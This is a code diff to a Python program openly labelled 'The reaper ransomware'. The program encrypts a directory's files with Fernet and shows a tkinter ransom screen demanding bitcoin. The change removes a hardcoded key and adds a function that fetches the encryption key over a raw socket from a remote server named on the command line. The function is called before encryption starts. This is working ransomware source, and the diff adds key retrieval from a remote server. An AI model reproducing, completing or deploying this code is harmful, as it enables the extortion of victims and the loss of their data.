@@ -1,5 +1,5 @@
 # The reaper ransomware 8========D
-import os,sys,json,time
+import os,sys,json,time,socket
 from cryptography.fernet import Fernet
 from tkinter import *
 from bitcoinlib.wallets import Wallet
@@ -8,7 +8,6 @@ from bitcoinlib.wallets import Wallet
 DIR = "C:/Users/krist/Documents/todo_list"
 TARGET_WALLET = "your wallet here"
 AMOUNT_OF_BITCOIN = 0.061
-KEY = b"oZLDJpM0ziURf6KW_EjAzBBLnSTYBrI5GxUGfTstJMQ="
 
 # Variables
 dirs = []
@@ -18,6 +17,7 @@ COLORS = {
   "red": "\033[1;31;40m",
   "white":"\033[1;37;40m",
 }
+HOST = sys.argv[2]
 banner = f"""
 {COLORS["hacker_green"]}
  /$$$$$$$                                                   
@@ -58,6 +58,16 @@ Instructions:
  - Press 'Pay' to send money and get the encryption key
 """
 
+# Method for getting the key from the server
+def get_key():
+  global KEY
+  s = socket.socket()
+  s.connect((HOST,80))
+  KEY = s.recvfrom(1024)
+  KEY = KEY[0]
+  s.close()
+  return KEY
+
 # Method for creating tkinter labels
 def create_tkinter_label(name,root,text,color,font_size):
   name = Label(root,text=text, bg="black", fg=color, font=("Courier", font_size))
@@ -85,6 +95,7 @@ def decrypt_json(fernet):
 # The file rewriting class
 class TakeOver():
   def __init__(self):
+    get_key()
     print(banner)
     # Encrypt file
     self.fernet = Fernet(KEY) 
